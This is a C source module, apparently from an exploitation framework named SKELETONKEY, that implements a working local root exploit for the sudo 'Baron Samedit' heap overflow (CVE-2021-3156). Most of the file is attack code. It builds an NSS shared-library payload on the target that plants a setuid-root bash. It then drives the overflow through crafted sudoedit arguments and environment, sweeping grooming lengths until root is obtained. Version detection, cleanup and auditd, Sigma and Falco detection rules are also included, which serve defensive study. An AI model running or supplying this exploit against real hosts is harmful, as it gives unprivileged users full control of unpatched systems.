/*
 * sudo_samedit_cve_2021_3156 — SKELETONKEY module
 *
 * STATUS: 🟢 WORKING EXPLOIT. Verified out-of-band on Ubuntu 18.04.0 /
 * sudo 1.8.21p2 / libc-2.27: `skeletonkey --exploit sudo_samedit` (as an
 * unprivileged, non-sudoer user) lands uid=0 and plants a root-owned
 * proof + setuid-root bash.
 *
 * The bug ("Baron Samedit", Qualys 2021-01-26): sudo's command-line
 * parser unescapes backslashes in the argv it copies into a heap buffer
 * in `set_cmnd()` (plugins/sudoers/sudoers.c). Invoked as `sudoedit -s`
 * with an argument ending in a lone backslash, the unescape loop walks
 * past the end of the argv string, copying adjacent env contents into an
 * undersized heap buffer. The overflow is exploited (per blasty's PoC) to
 * overwrite a glibc NSS `service_user` so a subsequent NSS lookup dlopen's
 * an attacker-planted `libnss_X/P0P_SH3LLZ_ .so.2` from the CWD; its
 * constructor runs while sudo is still root.
 *
 * Affects sudo 1.8.2 – 1.9.5p1 inclusive. Fixed in 1.9.5p2. Reachable by
 * any local user (the overflow precedes the sudoers/password check).
 *
 * Reference: https://www.qualys.com/2021/01/26/cve-2021-3156/
 *            baron-samedit-heap-based-overflow-sudo.txt
 *            PoC technique: github.com/blasty/CVE-2021-3156
 *
 * Detect: parse the sudo version (host fingerprint or `sudo --version`)
 * against the vulnerable range. Distro backports may patch without a
 * version bump, so a VULNERABLE verdict is "worth trying", confirmed only
 * by the exploit landing.
 *
 * Exploit: blasty's heap-grooming lengths (per libc family) drive the
 * overflow; we compile the NSS payload on the target, run sudoedit with
 * the crafted argv/env from a CWD holding the payload, and confirm root
 * by stat()'ing the root-owned artifacts — never by self-report. If the
 * primary lengths miss (libc layout drift), we sweep null_stomp_len like
 * blasty's brute.sh until root or the range is exhausted.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ---- Affected-version logic ------------------------------------- */

struct sudo_ver {
    int major;
    int minor;
    int patch;
    int p;        /* 'p' suffix; 0 if absent */
    bool parsed;
};

static struct sudo_ver parse_sudo_version(const char *s)
{
    struct sudo_ver v = {0, 0, 0, 0, false};
    while (*s && !isdigit((unsigned char)*s)) s++;
    if (!*s) return v;

    int maj = 0, min = 0, pat = 0;
    int consumed = 0;
    int n = sscanf(s, "%d.%d.%d%n", &maj, &min, &pat, &consumed);
    if (n < 2) return v;
    v.major = maj;
    v.minor = min;
    v.patch = (n >= 3) ? pat : 0;
    const char *tail = s + consumed;
    if (*tail == 'p') {
        int p = 0;
        if (sscanf(tail + 1, "%d", &p) == 1) v.p = p;
    }
    v.parsed = true;
    return v;
}

static int cmp_ver(const struct sudo_ver *a, const struct sudo_ver *b)
{
    if (a->major != b->major) return a->major - b->major;
    if (a->minor != b->minor) return a->minor - b->minor;
    if (a->patch != b->patch) return a->patch - b->patch;
    return a->p - b->p;
}

/* Returns true iff parsed sudo version is in [1.8.2, 1.9.5p1]. */
static bool sudo_version_vulnerable(const struct sudo_ver *v)
{
    if (!v->parsed) return false;
    struct sudo_ver lo = { 1, 8, 2, 0, true };
    struct sudo_ver hi = { 1, 9, 5, 1, true };
    return cmp_ver(v, &lo) >= 0 && cmp_ver(v, &hi) <= 0;
}

/* ---- Binary discovery ------------------------------------------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo", "/usr/local/bin/sudo", "/bin/sudo",
        "/sbin/sudo", "/usr/sbin/sudo", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID))
            return candidates[i];
    }
    return NULL;
}

static const char *find_sudoedit(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudoedit", "/usr/local/bin/sudoedit", "/bin/sudoedit",
        "/sbin/sudoedit", "/usr/sbin/sudoedit", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) return candidates[i];
    }
    return NULL;
}

/* ---- Detect ------------------------------------------------------ */

static skeletonkey_result_t sudo_samedit_detect(const struct skeletonkey_ctx *ctx)
{
    char line[256] = {0};
    if (ctx->host && ctx->host->sudo_version[0]) {
        snprintf(line, sizeof line, "Sudo version %s", ctx->host->sudo_version);
        if (!ctx->json)
            fprintf(stderr, "[i] sudo_samedit: host fingerprint reports "
                "sudo version %s\n", ctx->host->sudo_version);
    } else {
        const char *sudo_path = find_sudo();
        if (!sudo_path) {
            if (!ctx->json)
                fprintf(stderr, "[+] sudo_samedit: sudo not on path; no attack surface\n");
            return SKELETONKEY_PRECOND_FAIL;
        }
        if (!ctx->json)
            fprintf(stderr, "[i] sudo_samedit: found setuid sudo at %s\n", sudo_path);
        char cmd[512];
        snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
        FILE *p = popen(cmd, "r");
        if (!p) return SKELETONKEY_TEST_ERROR;
        char *r = fgets(line, sizeof line, p);
        pclose(p);
        if (!r) {
            if (!ctx->json)
                fprintf(stderr, "[?] sudo_samedit: could not read `sudo --version` output\n");
            return SKELETONKEY_TEST_ERROR;
        }
    }

    char *nl = strchr(line, '\n');
    if (nl) *nl = 0;

    struct sudo_ver v = parse_sudo_version(line);
    if (!v.parsed) {
        if (!ctx->json)
            fprintf(stderr, "[?] sudo_samedit: unparseable version line: '%s'\n", line);
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json) {
        fprintf(stderr, "[i] sudo_samedit: parsed version = %d.%d.%d",
                v.major, v.minor, v.patch);
        if (v.p) fprintf(stderr, "p%d", v.p);
        fprintf(stderr, "\n");
    }

    if (sudo_version_vulnerable(&v)) {
        if (!ctx->json)
            fprintf(stderr,
                "[!] sudo_samedit: version is in vulnerable range "
                "[1.8.2, 1.9.5p1] → VULNERABLE\n"
                "[i] sudo_samedit: distro backports may have patched "
                "without bumping the upstream version; check\n"
                "    `apt-cache policy sudo` for CVE-2021-3156.\n");
        return SKELETONKEY_VULNERABLE;
    }
    if (!ctx->json)
        fprintf(stderr,
            "[+] sudo_samedit: version is outside vulnerable range "
            "(fix 1.9.5p2+) — OK\n");
    return SKELETONKEY_OK;
}

/* ---- Exploit (blasty CVE-2021-3156 technique) -------------------- */

/* NSS payload source, compiled on the target into
 * <workdir>/libnss_X/P0P_SH3LLZ_ .so.2. Its constructor runs while sudo
 * is still root (the corrupted NSS lookup dlopen's it); it plants a
 * root-owned proof + setuid bash and exits. SK_PROOF/SK_ROOTBASH are
 * passed at compile time (the process env is the exploit vector, so we
 * can't smuggle paths through it). */
static const char samedit_payload_src[] =
    "#define _GNU_SOURCE\n"
    "#include <unistd.h>\n"
    "#include <stdlib.h>\n"
    "static void __attribute__((constructor)) _sk_init(void);\n"
    "static void _sk_init(void){\n"
    "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
    "  if (geteuid()!=0) return;            /* brute miss — don't drop */\n"
    "  system(\"id > \" SK_PROOF \" 2>&1; \"\n"
    "         \"cp -f /bin/bash \" SK_ROOTBASH \"; \"\n"
    "         \"chown 0:0 \" SK_ROOTBASH \" \" SK_PROOF \"; \"\n"
    "         \"chmod 4755 \" SK_ROOTBASH \"; sync\");\n"
    "  _exit(0);\n"
    "}\n";

/* blasty's per-libc-family grooming lengths. Ubuntu 18.04/20.04 share
 * one set; Debian 10 uses another. These are the (a, b, null, lc) tuples. */
struct samedit_target {
    const char *name;
    int smash_a, smash_b, null_stomp, lc_all;
};
static const struct samedit_target samedit_ubuntu = {
    "Ubuntu (sudo 1.8.21/1.8.31, libc 2.27/2.31)", 56, 54, 63, 212
};
static const struct samedit_target samedit_debian = {
    "Debian 10 (sudo 1.8.27, libc 2.28)", 64, 49, 60, 214
};

static const char *samedit_find_cc(void)
{
    static const char *ccs[] = {
        "/usr/bin/cc", "/usr/bin/gcc", "/usr/bin/clang",
        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
    };
    for (size_t i = 0; ccs[i]; i++)
        if (access(ccs[i], X_OK) == 0) return ccs[i];
    return NULL;
}

/* fork/exec argv, redirect stdio away, wait with a timeout. */
static int samedit_run(char *const argv[], const char *cwd, int secs)
{
    pid_t p = fork();
    if (p < 0) return -1;
    if (p == 0) {
        if (cwd && chdir(cwd) != 0) _exit(126);
        int dn = open("/dev/null", O_RDWR);
        if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        execv(argv[0], argv);
        _exit(127);
    }
    for (int i = 0; i < secs * 20; i++) {
        int st;
        pid_t r = waitpid(p, &st, WNOHANG);
        if (r == p) return 0;
        if (r < 0) return -1;
        usleep(50 * 1000);
    }
    kill(p, SIGKILL);
    waitpid(p, NULL, 0);
    return -2;
}

/* Run one sudoedit attempt with the given grooming lengths; returns true
 * iff the OOB proof file now exists and is root-owned. */
static bool samedit_try(const char *sudoedit, const char *workdir,
                        int a, int b, int null_stomp, int lc_all,
                        const char *proof)
{
    unlink(proof);

    char *smash_a = calloc(a + 2, 1);
    char *smash_b = calloc(b + 2, 1);
    char *lc = calloc(lc_all + 32, 1);
    if (!smash_a || !smash_b || !lc) { free(smash_a); free(smash_b); free(lc); return false; }
    memset(smash_a, 'A', a); smash_a[a] = '\\';
    memset(smash_b, 'B', b); smash_b[b] = '\\';
    strcpy(lc, "LC_ALL=C.UTF-8@");
    memset(lc + 15, 'C', lc_all);

    char *s_argv[] = { (char *)"sudoedit", (char *)"-s", smash_a,
                       (char *)"\\", smash_b, NULL };

    /* env: null_stomp × "\\", then the NSS selector, then the padded LC_ALL. */
    char **s_envp = calloc(null_stomp + 4, sizeof(char *));
    if (!s_envp) { free(smash_a); free(smash_b); free(lc); return false; }
    int pos = 0;
    for (int i = 0; i < null_stomp; i++) s_envp[pos++] = (char *)"\\";
    s_envp[pos++] = (char *)"X/P0P_SH3LLZ_";
    s_envp[pos++] = lc;
    s_envp[pos++] = NULL;

    /* We need a custom envp, so exec directly here in a child. */
    pid_t p = fork();
    if (p == 0) {
        if (chdir(workdir) != 0) _exit(126);
        int dn = open("/dev/null", O_RDWR);
        if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        execve(sudoedit, s_argv, s_envp);
        _exit(127);
    }
    if (p > 0) {
        for (int i = 0; i < 20 * 20; i++) {   /* up to ~20s */
            int st; pid_t r = waitpid(p, &st, WNOHANG);
            if (r == p) break;
            if (r < 0) break;
            usleep(50 * 1000);
        }
        int st; if (waitpid(p, &st, WNOHANG) == 0) { kill(p, SIGKILL); waitpid(p, NULL, 0); }
    }

    free(smash_a); free(smash_b); free(lc); free(s_envp);

    struct stat sb;
    return (stat(proof, &sb) == 0 && S_ISREG(sb.st_mode) && sb.st_uid == 0);
}

/* Remember what we planted / where, for cleanup(). */
static char samedit_workdir[256];
static char samedit_rootbash[256];
static char samedit_proof[256];

static skeletonkey_result_t sudo_samedit_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sudo_samedit: exploit requires --i-know (authorization gate)\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] sudo_samedit: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    skeletonkey_result_t pre = sudo_samedit_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] sudo_samedit: re-detect says not VULNERABLE; refusing\n");
        return pre;
    }

    const char *sudoedit = find_sudoedit();
    if (!sudoedit) {
        fprintf(stderr, "[-] sudo_samedit: sudoedit not found (needed by this technique)\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    const char *cc = samedit_find_cc();
    if (!cc) {
        fprintf(stderr, "[-] sudo_samedit: no C compiler on target to build the NSS "
                        "payload. Honest EXPLOIT_FAIL.\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Pick the grooming length-set by libc family (distro proxy). */
    const struct samedit_target *tgt = &samedit_ubuntu;
    if (ctx->host && (strcmp(ctx->host->distro_id, "debian") == 0)) tgt = &samedit_debian;
    if (!ctx->json)
        fprintf(stderr, "[*] sudo_samedit: target profile = %s\n", tgt->name);

    /* Scratch workdir with the NSS payload dir. */
    char tmpl[] = "/tmp/.sk-samedit-XXXXXX";
    char *wd = mkdtemp(tmpl);
    if (!wd) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }
    snprintf(samedit_workdir, sizeof samedit_workdir, "%s", wd);

    long tag = (long)getpid();
    snprintf(samedit_proof,    sizeof samedit_proof,    "/tmp/.sk-samedit-%ld.proof",    tag);
    snprintf(samedit_rootbash, sizeof samedit_rootbash, "/tmp/.sk-samedit-%ld.rootbash", tag);

    char nssdir[300], payload_c[320], nsslib[512], log_unused[300];
    (void)log_unused;
    snprintf(nssdir,    sizeof nssdir,    "%s/libnss_X", wd);
    snprintf(payload_c, sizeof payload_c, "%s/payload.c", wd);
    snprintf(nsslib,    sizeof nsslib,    "%s/libnss_X/P0P_SH3LLZ_ .so.2", wd);
    if (mkdir(nssdir, 0755) != 0 && errno != EEXIST) {
        perror("mkdir libnss_X");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Write + compile the NSS payload. */
    int fd = open(payload_c, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { perror("open payload.c"); return SKELETONKEY_TEST_ERROR; }
    (void)!write(fd, samedit_payload_src, sizeof samedit_payload_src - 1);
    close(fd);

    char dP[320], dR[320];
    snprintf(dP, sizeof dP, "-DSK_PROOF=\"%s\"",    samedit_proof);
    snprintf(dR, sizeof dR, "-DSK_ROOTBASH=\"%s\"", samedit_rootbash);
    char *cc_argv[] = {
        (char *)cc, (char *)"-fPIC", (char *)"-shared", (char *)"-O2", (char *)"-w",
        (char *)"-o", nsslib, payload_c, dP, dR, NULL,
    };
    if (!ctx->json)
        fprintf(stderr, "[*] sudo_samedit: building NSS payload with %s\n", cc);
    if (samedit_run(cc_argv, NULL, 60) != 0) {
        fprintf(stderr, "[-] sudo_samedit: payload compile failed\n");
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] sudo_samedit: driving sudoedit heap overflow "
                        "(primary lengths %d/%d/%d/%d)\n",
                tgt->smash_a, tgt->smash_b, tgt->null_stomp, tgt->lc_all);

    /* Primary attempt with the profile's exact lengths. */
    bool rooted = samedit_try(sudoedit, wd, tgt->smash_a, tgt->smash_b,
                              tgt->null_stomp, tgt->lc_all, samedit_proof);

    /* Fallback: sweep null_stomp_len around the profile value (libc drift),
     * exactly the axis blasty's brute.sh perturbs. Bounded + stops on root. */
    if (!rooted) {
        if (!ctx->json)
            fprintf(stderr, "[*] sudo_samedit: primary miss — sweeping null_stomp_len "
                            "%d..%d\n", tgt->null_stomp - 8, tgt->null_stomp + 8);
        for (int ns = tgt->null_stomp - 8; ns <= tgt->null_stomp + 8 && !rooted; ns++) {
            if (ns == tgt->null_stomp || ns < 1) continue;
            rooted = samedit_try(sudoedit, wd, tgt->smash_a, tgt->smash_b,
                                 ns, tgt->lc_all, samedit_proof);
            if (rooted && !ctx->json)
                fprintf(stderr, "[+] sudo_samedit: landed at null_stomp_len=%d\n", ns);
        }
    }

    /* Best-effort scrub of the scratch build dir (keep proof + rootbash). */
    { char rm[400]; snprintf(rm, sizeof rm, "rm -rf '%s' 2>/dev/null", wd);
      if (system(rm) != 0) { /* ignore */ } }

    if (rooted) {
        if (!ctx->json) {
            fprintf(stderr, "[+] sudo_samedit: ROOT — root-owned proof %s\n", samedit_proof);
            fprintf(stderr, "[+] sudo_samedit: setuid-root shell available: %s -p\n",
                    samedit_rootbash);
        }
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[-] sudo_samedit: no root artifact after primary + sweep — "
                        "honest EXPLOIT_FAIL. Host is likely backport-patched, or the "
                        "libc heap layout needs lengths outside the swept range "
                        "(see blasty brute.sh for a wider search).\n");
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t sudo_samedit_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[*] sudo_samedit: removing artifacts + scratch dir\n");
    if (samedit_proof[0])    unlink(samedit_proof);
    if (samedit_rootbash[0]) unlink(samedit_rootbash);
    if (samedit_workdir[0]) {
        char rm[400]; snprintf(rm, sizeof rm, "rm -rf '%s' 2>/dev/null", samedit_workdir);
        if (system(rm) != 0) { /* ignore */ }
    }
    if (system("rm -rf /tmp/.sudo_edit_* 2>/dev/null") != 0) { /* ignore */ }
    return SKELETONKEY_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char sudo_samedit_auditd[] =
    "# Baron Samedit (CVE-2021-3156) — auditd detection rules\n"
    "# Flag sudoedit invocations carrying the canonical -s flag and\n"
    "# the trailing-backslash trigger pattern.\n"
    "-w /usr/bin/sudoedit -p x -k skeletonkey-samedit\n"
    "-w /usr/bin/sudo     -p x -k skeletonkey-samedit-sudo\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo     -k skeletonkey-samedit-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/sudo     -k skeletonkey-samedit-execve\n";

static const char sudo_samedit_sigma[] =
    "title: Possible Baron Samedit exploitation (CVE-2021-3156)\n"
    "id: 3f7c5a2e-skeletonkey-samedit\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects sudoedit (or sudo invoked as sudoedit) executed with the\n"
    "  -s flag and a command-line argument ending in a lone backslash —\n"
    "  the canonical Qualys trigger for the heap overflow in\n"
    "  plugins/sudoers/sudoers.c set_cmnd(). A libnss_X/ directory in the\n"
    "  caller's CWD is a strong corroborating artifact.\n"
    "logsource:\n"
    "  product: linux\n"
    "  service: auditd\n"
    "detection:\n"
    "  sudoedit_exec:\n"
    "    type: 'EXECVE'\n"
    "    exe|endswith:\n"
    "      - '/sudoedit'\n"
    "      - '/sudo'\n"
    "  shell_edit_flag:\n"
    "    CommandLine|contains: ' -s '\n"
    "  trailing_backslash:\n"
    "    CommandLine|re: '\\\\\\\\\\s*$'\n"
    "  argv0_sudoedit:\n"
    "    argv0|endswith: 'sudoedit'\n"
    "  condition: sudoedit_exec and shell_edit_flag and (trailing_backslash or argv0_sudoedit)\n"
    "fields:\n"
    "  - exe\n"
    "  - argv\n"
    "level: high\n"
    "tags:\n"
    "  - attack.privilege_escalation\n"
    "  - attack.t1068\n"
    "  - cve.2021.3156\n";

static const char sudo_samedit_falco[] =
    "- rule: sudoedit with -s and trailing-backslash argv (Baron Samedit)\n"
    "  desc: |\n"
    "    sudoedit invoked with -s and one or more args ending in '\\'.\n"
    "    The parser's unescape loop walks past the argv string into\n"
    "    adjacent env, overflowing the heap buffer.\n"
    "    CVE-2021-3156. False positives: extraordinarily rare;\n"
    "    legitimate sudoedit usage does not need trailing backslashes.\n"
    "  condition: >\n"
    "    spawned_process and proc.name = sudoedit and\n"
    "    proc.args contains \"-s \\\\\"\n"
    "  output: >\n"
    "    Possible Baron Samedit sudoedit invocation\n"
    "    (user=%user.name pid=%proc.pid cmdline=\"%proc.cmdline\")\n"
    "  priority: CRITICAL\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2021.3156]\n";

/* ---- Module registration ----------------------------------------- */

const struct skeletonkey_module sudo_samedit_module = {
    .name           = "sudo_samedit",
    .cve            = "CVE-2021-3156",
    .summary        = "sudo Baron Samedit heap overflow via sudoedit -s → NSS libnss_X hijack → root (blasty)",
    .family         = "sudo",
    .kernel_range   = "userspace — sudo 1.8.2 ≤ V ≤ 1.9.5p1 (fixed in 1.9.5p2)",
    .detect         = sudo_samedit_detect,
    .exploit        = sudo_samedit_exploit,
    .mitigate       = NULL,    /* mitigation = upgrade sudo to 1.9.5p2+ */
    .cleanup        = sudo_samedit_cleanup,
    .detect_auditd  = sudo_samedit_auditd,
    .detect_sigma   = sudo_samedit_sigma,
    .detect_yara    = NULL,
    .detect_falco   = sudo_samedit_falco,
    .opsec_notes    = "Compiles a small NSS payload on the target (needs cc/gcc), then execs sudoedit with argv = { 'sudoedit','-s','AAAA…\\','\\','BBBB…\\' } and an env of N backslashes + 'X/P0P_SH3LLZ_' + a padded LC_ALL, from a CWD holding libnss_X/'P0P_SH3LLZ_ .so.2'. The set_cmnd() unescape overflow overwrites a glibc NSS service_user so the subsequent lookup dlopen's the payload, whose constructor runs while sudo is root. Very audit-visible: execve(sudoedit) with -s + trailing-backslash argv, an unusual all-backslash environ, and a libnss_X/ dir in CWD. Grooming lengths are libc-family specific; a miss sweeps null_stomp_len. Artifacts: root-owned proof + setuid bash under /tmp (removed by cleanup()); scratch build dir is scrubbed during the run. Misses may SIGSEGV sudo (dmesg).",
    .arch_support   = "any",
};

void skeletonkey_register_sudo_samedit(void) { skeletonkey_register(&sudo_samedit_module); }
